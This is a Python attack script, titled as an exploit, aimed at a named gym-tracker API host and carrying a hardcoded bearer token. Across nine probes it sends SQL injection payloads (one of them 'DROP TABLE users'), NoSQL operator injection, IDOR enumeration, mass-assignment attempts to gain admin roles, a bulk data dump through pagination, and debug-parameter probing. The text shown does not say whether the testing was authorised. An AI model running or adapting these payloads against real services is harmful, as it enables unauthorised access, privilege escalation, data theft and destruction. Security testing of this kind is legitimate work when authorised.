# -*- coding: utf-8 -*-
"""
Exploit Existing Endpoints - Database Access
Target: /api/exercises (working endpoint)
"""
import requests
import json
import sys

if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

API_URL = "https://gym-api.algorynth.net"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2LCJlbWFpbCI6InRlc3Rfc2VjdXJpdHlAZXhhbXBsZS5jb20iLCJpc3MiOiJneW0tdHJhY2tlci1hcGkiLCJleHAiOjE3Njc0Mzk0ODYsImlhdCI6MTc2NzM1MzA4Nn0.SJFr0yGvNspzbQktTDLB81Lb6DHsREXjcnUEbngUE1c"

print("="*80)
print("EXPLOITING /api/exercises ENDPOINT")
print("="*80)

headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

# Test 1: Normal Request
print("\n[TEST 1] Normal Request (Baseline)")
print("-"*80)
try:
    r = requests.get(f"{API_URL}/api/exercises", headers=headers, timeout=5)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:300]}")
    
    # Parse response
    try:
        data = r.json()
        print(f"\nData structure: {type(data)}")
        if isinstance(data, list) and len(data) > 0:
            print(f"First item keys: {list(data[0].keys())}")
    except:
        pass
except Exception as e:
    print(f"Error: {e}")

# Test 2: Query Parameters (SQL Injection)
print("\n[TEST 2] SQL Injection via Query Parameters")
print("-"*80)

sql_params = [
    {"id": "1' OR '1'='1"},
    {"id": "1 UNION SELECT * FROM users"},
    {"search": "' OR 1=1--"},
    {"filter": "admin' OR '1'='1"},
    {"limit": "1; DROP TABLE users--"}
]

for params in sql_params:
    try:
        r = requests.get(f"{API_URL}/api/exercises", params=params, headers=headers, timeout=3)
        
        if "sql" in r.text.lower() or "syntax" in r.text.lower():
            print(f"  ðŸš¨ SQL ERROR: {params} -> {r.text[:100]}")
        elif r.status_code == 200 and len(r.text) > 500:
            print(f"  âš ï¸  LARGE RESPONSE: {params} -> {len(r.text)} bytes")
    except:
        pass

# Test 3: NoSQL Injection (MongoDB)
print("\n[TEST 3] NoSQL Injection")
print("-"*80)

nosql_payloads = [
    {"filter": {"$gt": ""}},
    {"where": {"$ne": None}},
    {"query": {"$regex": ".*"}},
    {"search": {"$where": "1==1"}}
]

for payload in nosql_payloads:
    try:
        r = requests.post(f"{API_URL}/api/exercises", json=payload, headers=headers, timeout=3)
        
        if r.status_code == 200:
            print(f"  âš ï¸  Accepted: {list(payload.keys())[0]} -> {r.status_code}")
            print(f"     Response: {r.text[:150]}")
    except:
        pass

# Test 4: ID Enumeration (IDOR)
print("\n[TEST 4] ID Enumeration (IDOR)")
print("-"*80)

for exercise_id in [1, 2, 999, -1, 0]:
    try:
        r = requests.get(f"{API_URL}/api/exercises/{exercise_id}", headers=headers, timeout=3)
        
        if r.status_code == 200:
            print(f"  Exercise {exercise_id}: {r.status_code} -> {r.text[:100]}")
    except:
        pass

# Test 5: Parameter Pollution  
print("\n[TEST 5] Parameter Pollution")
print("-"*80)

pollution_params = {
    "id": ["1", "2", "3"],
    "limit": ["10", "999999"],
    "select": ["*", "password", "users.*"]
}

try:
    r = requests.get(f"{API_URL}/api/exercises", params=pollution_params, headers=headers, timeout=3)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:200]}")
except Exception as e:
    print(f"Error: {e}")

# Test 6: Include/Expand Relations (DB Relations)
print("\n[TEST 6] Include Database Relations")
print("-"*80)

include_params = [
    {"include": "users"},
    {"include": "all"},
    {"expand": "user"},
    {"with": "password"},
    {"populate": "user,password"},
    {"fields": "id,name,password,email"}
]

for params in include_params:
    try:
        r = requests.get(f"{API_URL}/api/exercises", params=params, headers=headers, timeout=3)
        
        if r.status_code == 200:
            # Check if response has extra data
            try:
                data = r.json()
                if "password" in str(data).lower() or "user" in str(data).lower():
                    print(f"  ðŸš¨ FOUND: {params} -> Contains sensitive data!")
                    print(f"     {r.text[:200]}")
            except:
                pass
    except:
        pass

# Test 7: Mass Assignment
print("\n[TEST 7] Mass Assignment Attack")
print("-"*80)

try:
    malicious_data = {
        "name": "Hacked Exercise",
        "user_id": 1,  # Try to assign to admin
        "is_admin": True,
        "role": "admin",
        "owner_id": 1
    }
    
    r = requests.post(f"{API_URL}/api/exercises", json=malicious_data, headers=headers, timeout=3)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:200]}")
    
    if r.status_code in [200, 201]:
        # Check if admin fields were accepted
        response_data = r.json()
        if "admin" in str(response_data).lower() or "role" in str(response_data).lower():
            print(f"  ðŸš¨ MASS ASSIGNMENT VULNERABLE!")
except Exception as e:
    print(f"Error: {e}")

# Test 8: Pagination Abuse (Data Exfiltration)
print("\n[TEST 8] Pagination Abuse")
print("-"*80)

try:
    r = requests.get(f"{API_URL}/api/exercises?limit=999999&offset=0", headers=headers, timeout=5)
    print(f"Status: {r.status_code}")
    print(f"Response size: {len(r.text)} bytes")
    
    if len(r.text) > 10000:
        print(f"  ðŸš¨ LARGE DATA DUMP: {len(r.text)} bytes retrieved")
        
        try:
            data = r.json()
            print(f"  Items count: {len(data) if isinstance(data, list) else 'N/A'}")
        except:
            pass
except Exception as e:
    print(f"Error: {e}")

# Test 9: Debug Parameters
print("\n[TEST 9] Debug/Admin Parameters")
print("-"*80)

debug_params = [
    {"debug": "true"},
    {"debug": "1"},
    {"admin": "true"},
    {"test": "true"},
    {"verbose": "true"},
    {"explain": "true"}
]

for params in debug_params:
    try:
        r = requests.get(f"{API_URL}/api/exercises", params=params, headers=headers, timeout=3)
        
        if "query" in r.text.lower() or "database" in r.text.lower() or "sql" in r.text.lower():
            print(f"  ðŸš¨ DEBUG INFO: {params} -> {r.text[:150]}")
    except:
        pass

print("\n" + "="*80)
print("EXPLOITATION ATTEMPT COMPLETE")
print("="*80)
print("\nCheck output above for ðŸš¨ markers indicating vulnerabilities")
print("="*80)
